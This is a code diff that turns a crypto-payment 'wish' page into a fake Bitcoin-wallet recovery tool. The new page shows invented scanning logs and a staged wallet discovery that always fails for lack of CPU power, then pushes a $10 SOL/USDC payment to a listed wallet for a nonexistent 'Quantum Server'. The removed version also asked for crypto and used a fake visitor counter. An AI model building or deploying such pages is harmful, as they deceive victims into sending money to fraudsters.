@@ -3,127 +3,204 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Universe Protocol</title>
+    <title>BTC_RECOVERY_TOOL</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #000; color: #fff; font-family: 'Cinzel', serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        body { background-color: #050505; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; font-size: 11px; }
         
-        /* SPACE BACKGROUND */
-        .space { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%); }
-        .stars { width: 1px; height: 1px; background: transparent; box-shadow: 100px 200px #FFF , 300px 400px #FFF , 500px 100px #FFF; animation: animStar 50s linear infinite; }
-        .stars:after { content: " "; position: absolute; top: 2000px; width: 1px; height: 1px; background: transparent; box-shadow: 100px 200px #FFF , 300px 400px #FFF , 500px 100px #FFF; }
-        
-        /* MAIN CONTAINER */
-        .container { z-index: 10; text-align: center; background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(100, 200, 255, 0.2); max-width: 90%; width: 400px; animation: float 6s ease-in-out infinite;}
-        
-        h1 { font-size: 24px; letter-spacing: 5px; margin-bottom: 10px; color: #d4af37; text-shadow: 0 0 10px #d4af37; }
-        p { font-size: 12px; color: #ccc; margin-bottom: 30px; line-height: 1.6; }
-        
-        /* INPUT AREA */
-        textarea { width: 100%; height: 100px; background: rgba(0,0,0,0.5); border: 1px solid #d4af37; color: #fff; padding: 10px; font-family: inherit; font-size: 16px; border-radius: 5px; resize: none; outline: none; text-align: center; }
-        textarea::placeholder { color: #555; }
-        
-        /* BUTTON */
-        .btn { margin-top: 20px; background: linear-gradient(45deg, #d4af37, #f8f0c5); border: none; padding: 15px 40px; font-size: 16px; font-weight: bold; color: #000; cursor: pointer; border-radius: 50px; box-shadow: 0 0 20px rgba(212, 175, 55, 0.5); transition: 0.3s; letter-spacing: 2px;}
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(212, 175, 55, 0.8); }
+        /* INFO PANEL (توضیحات جدید) */
+        #info-panel {
+            background: #111;
+            border-bottom: 2px solid lime;
+            padding: 10px;
+            color: #ccc;
+            font-size: 10px;
+            box-shadow: 0 0 15px rgba(0,255,0,0.2);
+            z-index: 20;
+            position: relative;
+        }
+        .highlight { color: #fff; font-weight: bold; }
+        .red-alert { color: red; font-weight: bold; animation: flash 1s infinite; }
 
-        /* PAYMENT MODAL (HIDDEN) */
-        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20; align-items: center; justify-content: center; flex-direction: column; }
-        .pay-box { background: #111; border: 2px solid #d4af37; padding: 30px; text-align: center; border-radius: 10px; width: 90%; max-width: 350px; }
-        .wallet { background: #222; color: #d4af37; padding: 10px; font-family: monospace; font-size: 12px; margin: 15px 0; border: 1px dashed #555; user-select: all; word-break: break-all;}
-        .confirm-btn { background: #0088cc; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 10px; font-weight: bold;}
+        /* TERMINAL LOOK */
+        #console { padding: 10px; height: 50vh; overflow-y: hidden; mask-image: linear-gradient(to bottom, black 90%, transparent 100%); }
+        .log { margin-bottom: 2px; opacity: 0.8; }
+        .fail { color: #444; }
+        .success { color: #0f0; font-weight: bold; background: rgba(0, 255, 0, 0.1); padding: 2px; }
+        .warning { color: yellow; font-weight: bold; animation: flash 0.5s infinite; }
+        .error { color: red; font-weight: bold; }
 
-        /* ANIMATIONS */
-        @keyframes animStar { from { transform: translateY(0px); } to { transform: translateY(-2000px); } }
-        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-20px); } 100% { transform: translateY(0px); } }
+        /* HUD */
+        #hud { height: 35vh; background: #0a0a0a; border-top: 1px solid #333; padding: 15px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; z-index: 10; position: relative;}
         
-        /* START OVERLAY */
-        #startOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; cursor: pointer;}
-        .tap-text { font-size: 20px; animation: pulse 2s infinite; color: #888; letter-spacing: 3px;}
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        /* STATUS BARS */
+        .bar-container { width: 100%; max-width: 400px; background: #222; height: 15px; border-radius: 2px; margin-bottom: 5px; position: relative; border: 1px solid #444;}
+        .bar-fill { height: 100%; background: lime; width: 0%; transition: width 0.2s; box-shadow: 0 0 5px lime;}
+        .bar-text { position: absolute; top: 0; left: 5px; color: #000; font-weight: bold; font-size: 9px; line-height: 15px;}
+
+        /* BIG BUTTON */
+        .boost-btn {
+            background: linear-gradient(to bottom, #990000, #550000);
+            border: 2px solid red;
+            color: white;
+            padding: 12px;
+            width: 95%;
+            max-width: 350px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            box-shadow: 0 0 10px red;
+            animation: pulse 2s infinite;
+            text-transform: uppercase;
+            margin-top: 10px;
+        }
+        
+        /* MODAL */
+        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .modal-box { border: 2px solid lime; padding: 20px; background: #000; width: 300px; border-radius: 10px; box-shadow: 0 0 30px lime; }
+
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
     </style>
-    <!-- FONT -->
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <!-- BACKGROUND -->
-    <div class="space"><div class="stars"></div></div>
-
-    <!-- START OVERLAY (To allow audio) -->
-    <div id="startOverlay" onclick="startExperience()">
-        <div class="tap-text">TAP TO ENTER THE VOID</div>
+    <!-- 📘 بخش توضیحات (اضافه شد) -->
+    <div id="info-panel">
+        <span style="color: lime; font-weight: bold;">/// SYSTEM_ROOT: ACCESS GRANTED ///</span><br><br>
+        <span class="highlight">TARGET:</span> Recovering Lost Bitcoin Wallets (Dead Keys).<br>
+        <span class="highlight">STATUS:</span> Scanning Blockchain for non-zero balances...<br>
+        <span class="highlight">WARNING:</span> Your local device CPU is <span class="red-alert">TOO WEAK</span> to crack complex passwords. Connection to Quantum Server is recommended.
     </div>
 
-    <!-- MAIN APP -->
-    <div class="container">
-        <h1>UNIVERSE PROTOCOL</h1>
-        <p>Write your deepest wish below.<br>We will encode it into the digital ether.<br>The universe is listening.</p>
-        
-        <textarea id="wishInput" placeholder="I wish for..."></textarea>
-        
-        <button class="btn" onclick="sendWish()">MANIFEST IT</button>
-        
-        <p style="margin-top: 20px; font-size: 10px; color: #666;">Total Wishes Sent: <span id="counter">12,408</span></p>
+    <div id="console"></div>
+
+    <div id="hud">
+        <div style="width:100%; max-width:400px; display:flex; justify-content:space-between; color:#666; margin-bottom:5px;">
+            <span>KEYS: <span id="keyCount" style="color:#fff">0</span></span>
+            <span>SPEED: <span id="speed" style="color:#fff">14</span> H/s</span>
+        </div>
+
+        <!-- Progress Bars -->
+        <div class="bar-container">
+            <div class="bar-fill" id="powerBar"></div>
+            <div class="bar-text">CPU LOAD: <span id="cpuVal">12</span>%</div>
+        </div>
+        <div class="bar-container">
+            <div class="bar-fill" id="netBar" style="background: cyan; width: 10%;"></div>
+            <div class="bar-text">NETWORK: LOW LATENCY</div>
+        </div>
+
+        <div id="statusText" style="color: #666; font-size: 10px; margin-bottom: 10px; margin-top: 5px;">SCANNING NODES...</div>
+
+        <button class="boost-btn" onclick="openPayment()">
+            🚀 RENT CLOUD SERVER ($10)<br>
+            <span style="font-size:9px; font-weight:normal; color: #ccc;">Unlock 100% Success Rate</span>
+        </button>
     </div>
 
     <!-- PAYMENT MODAL -->
-    <div id="payModal">
-        <div class="pay-box">
-            <h2 style="color: #d4af37;">ENERGY REQUIRED</h2>
-            <p style="font-size: 14px;">To permanently lock this wish into the Universe Block, a gas fee is required.</p>
-            <p style="font-size: 18px; font-weight: bold; color: #fff;">$5.00 (Crypto)</p>
-            
-            <p style="text-align: left; font-size: 12px; color: #888;">Send SOL/USDC to:</p>
-            <div class="wallet">4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU</div>
-            
-            <a href="https://t.me/justbuzzfun" target="_blank" class="confirm-btn">✅ I SENT IT - LOCK MY WISH</a>
-            <br><br>
-            <span style="font-size: 10px; color: #555; cursor: pointer;" onclick="closeModal()">Cancel</span>
+    <div id="paymentModal">
+        <div class="modal-box">
+            <h2 style="color: lime; margin-top:0;">ACCESS GRANTED</h2>
+            <p style="color: #fff; font-size: 12px;">Connect to Quantum Server Network to crack wallets instantly.</p>
+            <div style="background:#222; padding:10px; color:orange; font-family:monospace; border:1px dashed orange; margin:10px 0; user-select:all; word-break:break-all; font-size: 10px;">
+                4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU
+            </div>
+            <p style="font-size:10px; color:#888;">Send $10 SOL/USDC. System auto-detects.</p>
+            <a href="https://t.me/justbuzzfun" target="_blank" style="display:block; background:blue; color:white; padding:10px; text-decoration:none; margin-top:10px; font-weight: bold; border-radius: 5px;">✅ I PAID - ACTIVATE SERVER</a>
+            <br>
+            <span style="color:#555; cursor:pointer; font-size:10px;" onclick="closePayment()">[ CLOSE ]</span>
         </div>
     </div>
 
-    <!-- AUDIO -->
-    <audio id="bgMusic" loop>
-        <source src="https://cdn.pixabay.com/download/audio/2022/03/09/audio_c8c8a73467.mp3" type="audio/mpeg">
-    </audio>
-
-    <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        const music = document.getElementById('bgMusic');
-        const modal = document.getElementById('payModal');
+        const consoleDiv = document.getElementById('console');
+        const keyCountEl = document.getElementById('keyCount');
+        const statusText = document.getElementById('statusText');
+        const cpuVal = document.getElementById('cpuVal');
+        const powerBar = document.getElementById('powerBar');
         
-        // 1. ورود به سایت و پخش موزیک
-        function startExperience() {
-            document.getElementById('startOverlay').style.opacity = '0';
-            setTimeout(() => document.getElementById('startOverlay').style.display = 'none', 1000);
-            music.volume = 0.5;
-            music.play().catch(e => console.log("Audio needs interaction"));
+        let keysScanned = 140290;
+        let isCracking = false;
+
+        function randomWallet() {
+            const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let res = '1';
+            for (let i = 0; i < 33; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
+            return res;
         }
 
-        // 2. دکمه ارسال آرزو
-        function sendWish() {
-            const text = document.getElementById('wishInput').value;
-            if(text.length < 3) return alert("Please write a wish.");
-            
-            // نمایش صفحه پرداخت
-            modal.style.display = 'flex';
-            
-            // ارسال سیگنال به سرور (برای افکت ستاره دنباله‌دار در آینده)
-            socket.emit('buzz-trigger');
+        function addLog(text, type = 'fail') {
+            const div = document.createElement('div');
+            div.className = 'log ' + type;
+            div.innerText = text;
+            consoleDiv.appendChild(div);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            if(consoleDiv.childElementCount > 50) consoleDiv.removeChild(consoleDiv.firstChild);
         }
 
-        function closeModal() {
-            modal.style.display = 'none';
-        }
-
-        // شمارنده الکی (برای حس شلوغی)
-        let count = 12408;
         setInterval(() => {
-            count += Math.floor(Math.random() * 3);
-            document.getElementById('counter').innerText = count.toLocaleString();
-        }, 5000);
+            if(isCracking) return;
 
+            keysScanned += Math.floor(Math.random() * 5);
+            keyCountEl.innerText = keysScanned.toLocaleString();
+            
+            const cpu = 10 + Math.floor(Math.random() * 20);
+            cpuVal.innerText = cpu;
+            powerBar.style.width = cpu + "%";
+
+            if(Math.random() > 0.05) {
+                addLog(`Scan: ${randomWallet().substring(0,12)}... > 0.00 BTC`, 'fail');
+            } else {
+                addLog(`Scan: ${randomWallet().substring(0,12)}... > ERROR: Encrypted`, 'error');
+            }
+        }, 80);
+
+        // جادوی پیدا کردن (هر ۱۲ ثانیه)
+        setInterval(() => {
+            if(isCracking) return;
+
+            isCracking = true;
+            statusText.innerText = "⚠️ SIGNAL DETECTED! DECRYPTING...";
+            statusText.style.color = "yellow";
+            
+            addLog("------------------------------------------------", "warning");
+            addLog("⚠️ WALLET FOUND: " + randomWallet(), "warning");
+            addLog("💰 BALANCE: " + (Math.random() * 5 + 0.5).toFixed(4) + " BTC", "warning");
+            addLog("🔓 CRACKING PRIVATE KEY...", "success");
+
+            let progress = 0;
+            const crackInterval = setInterval(() => {
+                progress += 2;
+                powerBar.style.width = progress + "%";
+                cpuVal.innerText = 99;
+                
+                if(progress < 85) {
+                    addLog(`> Decrypting... ${progress}% ...`);
+                } else {
+                    clearInterval(crackInterval);
+                    // شکست!
+                    addLog("❌ FAILED: CPU TOO WEAK", "error");
+                    addLog("❌ SERVER DISCONNECTED", "error");
+                    addLog("------------------------------------------------", "fail");
+                    
+                    statusText.innerText = "FAILED. NEED MORE POWER.";
+                    statusText.style.color = "red";
+                    
+                    setTimeout(() => {
+                        isCracking = false;
+                        statusText.innerText = "SCANNING...";
+                        statusText.style.color = "#666";
+                        openPayment();
+                    }, 2000);
+                }
+            }, 100);
+
+        }, 12000);
+
+        function openPayment() { document.getElementById('paymentModal').style.display = 'flex'; }
+        function closePayment() { document.getElementById('paymentModal').style.display = 'none'; }
     </script>
 </body>
 </html>
